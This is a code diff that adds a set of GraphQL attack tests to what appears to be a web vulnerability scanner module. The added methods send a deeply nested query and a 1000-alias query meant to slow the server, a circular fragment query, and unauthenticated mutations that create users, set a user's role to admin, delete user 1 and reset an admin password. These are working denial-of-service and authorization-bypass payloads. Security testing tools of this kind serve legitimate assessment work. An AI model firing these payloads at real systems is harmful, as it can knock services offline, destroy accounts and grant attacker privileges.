@@ -203,3 +203,104 @@ class GraphQLModule:
     def _is_introspection_result(body: str) -> bool:
         """Return True when body contains introspection type listing."""
         return '"__schema"' in body and '"types"' in body
+
+    # ------------------------------------------------------------------
+    # Phase K: Advanced GraphQL Attacks
+    # ------------------------------------------------------------------
+
+    def _test_depth_dos(self, endpoint):
+        """K1: Nested query depth attack — DoS via deeply nested query."""
+        # Build a 15-level nested query
+        depth = 15
+        inner = '__typename'
+        for _ in range(depth):
+            inner = f'{{ users {{ friends {inner} }} }}'
+        query = f'query {{ {inner} }}'
+        payload = {'query': query}
+        try:
+            import time
+            start = time.time()
+            resp = self.requester.request(endpoint, 'POST', json_data=payload)
+            elapsed = time.time() - start
+            if resp and elapsed > 5:
+                from core.engine import Finding
+                self.engine.add_finding(Finding(
+                    technique='GraphQL Depth DoS',
+                    url=endpoint, param='', payload=query[:200],
+                    evidence=f'Response took {elapsed:.1f}s (depth={depth})',
+                    severity='HIGH', confidence=0.7,
+                ))
+        except Exception:
+            pass
+
+    def _test_alias_amplification(self, endpoint):
+        """K1: Aliased query amplification — duplicate __typename 1000x."""
+        aliases = ' '.join(f'a{i}:__typename' for i in range(1000))
+        query = f'{{ {aliases} }}'
+        payload = {'query': query}
+        try:
+            import time
+            start = time.time()
+            resp = self.requester.request(endpoint, 'POST', json_data=payload)
+            elapsed = time.time() - start
+            if resp and elapsed > 3:
+                from core.engine import Finding
+                self.engine.add_finding(Finding(
+                    technique='GraphQL Alias Amplification DoS',
+                    url=endpoint, param='', payload=query[:200],
+                    evidence=f'1000 aliases → {elapsed:.1f}s response',
+                    severity='HIGH', confidence=0.65,
+                ))
+        except Exception:
+            pass
+
+    def _test_fragment_cycle(self, endpoint):
+        """K1: Circular fragment references."""
+        query = '''
+        query { ...A }
+        fragment A on Query { ...B }
+        fragment B on Query { ...A }
+        '''
+        payload = {'query': query}
+        try:
+            resp = self.requester.request(endpoint, 'POST', json_data=payload)
+            if resp:
+                body = resp.text or ''
+                # If server doesn't reject this, it may loop
+                if resp.status_code == 200 and 'error' not in body.lower():
+                    from core.engine import Finding
+                    self.engine.add_finding(Finding(
+                        technique='GraphQL Fragment Cycle',
+                        url=endpoint, param='', payload=query.strip()[:200],
+                        evidence=body[:300],
+                        severity='MEDIUM', confidence=0.6,
+                    ))
+        except Exception:
+            pass
+
+    def _test_mutation_auth_bypass(self, endpoint):
+        """K2: Test mutations without authentication."""
+        mutations = [
+            'mutation { createUser(username:"test", password:"test") { id } }',
+            'mutation { updateUser(id:1, role:"admin") { id role } }',
+            'mutation { deleteUser(id:1) { success } }',
+            'mutation { resetPassword(email:"admin@test.com") { success } }',
+        ]
+        for mutation in mutations:
+            payload = {'query': mutation}
+            try:
+                resp = self.requester.request(endpoint, 'POST', json_data=payload,
+                                              headers={'Authorization': ''})
+                if resp and resp.status_code == 200:
+                    body = resp.text or ''
+                    if self._is_graphql_response(body) and 'error' not in body.lower():
+                        from core.engine import Finding
+                        self.engine.add_finding(Finding(
+                            technique='GraphQL Mutation Auth Bypass',
+                            url=endpoint, param='', payload=mutation[:200],
+                            evidence=body[:300],
+                            severity='CRITICAL', confidence=0.7,
+                        ))
+                        return
+            except Exception:
+                continue
